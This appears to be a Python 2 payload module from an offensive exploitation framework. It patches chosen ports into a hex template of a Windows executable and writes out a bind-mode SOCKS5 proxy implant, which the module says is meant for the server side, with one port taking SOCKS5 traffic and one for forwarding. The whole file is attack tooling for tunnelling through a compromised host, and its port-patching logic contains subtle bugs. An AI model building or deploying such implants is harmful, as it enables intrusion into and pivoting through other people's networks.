#! /usr/bin/env python
# -*- coding: utf-8 -*-

from lib.ple.tools.lib.payloads.payload import * 



class Payload(BGExploit):
        
    def __init__(self):
        super(self.__class__, self).__init__()

        self.register_info({
            "Info":{
                "Name":"proxy_bind_remote_socks5_x86",
                "Author":"Mosin",
                "Type":"Bind",
                "Ref":"----",
                "Version":"1.0",
                "Desc":"This module plug-ins are in the local binding two ports, one for receiving SOCK5 agent, one for the forward agent.\
                        This plugin is mainly used for the server."
            }
        })
        
        #自定义显示参数
        self.register_option({
            "LPORT": {
                "default": "4444",
                "desc": "SOCK5监听端口",
                "Required":"no"
            },
            "LPORT1": {
                "default": "5555",
                "desc": "Proxifier监听端口",
                "Required":"no"
            },
            "FILEPATH": {
                "default": "/test.exe",
                "desc": "保存文件的路径名",
                "Required":"no"
            }
        })

    #获取需要改变的信息
    def get_ex(self,file_data,ex_port1,ex_port):
        self_port1 = "35353535"
        self_port = "34343434"
        
        ex_data = ""

        if file_data.find(self_port1):
            ex_port1_len = file_data.find(self_port1)
            ex_port1_data = file_data[ex_port1_len:ex_port1_len + len(ex_port1)]
            ex_data = file_data.replace(ex_port1_data,ex_port1)
            
        if ex_data.find(self_port):
            ex_port_len = ex_data.find(self_port)
            ex_port_data = ex_data[ex_port_len:ex_port_len + len(ex_port)]
            ex_data = ex_data.replace(ex_port_data,ex_port)
        return ex_data

    #转十六进制
    def cover(self,ex_port):
        port_tmp = ""
        #ip_tmp = ""
        for i in ex_port:
            tmp = i.encode('hex')
            port_tmp += tmp
            
        return port_tmp

    #写出文件
    def write_exe(self,file_data,path_name):
        print u"[+] 保存中..."
        try:
            ex_datas = file_data.decode("hex")
            ff = open(path_name,'wb')
            ff.write(ex_datas)
            ff.close()
            print u"[+] 文件保存路径在" + path_name
        except:
            print u"[-] 文件保存失败!请检查路径或参数"
        

    #打开文件
    def open_file(self):
        try:
            f = open('lib/soure/data/win_proxy_remote_bind_x86_sock5.shell','r')
            file_data = f.read()
            f.close()
        except:
            print "[-] TempleteFile Open Fail"
        return file_data
        
    def payload(self):
        ex_port = self.options.LPORT['default']
        ex_port1 = self.options.LPORT1['default']
        path_name = self.options.FILEPATH['default']
        ex_port = self.cover(ex_port)
        ex_port1 = self.cover(ex_port1)
        print u"[+] 正在转换..."
        file_data = self.open_file()
        get_data = self.get_ex(file_data, ex_port1 ,ex_port)
        self.write_exe(get_data,path_name)
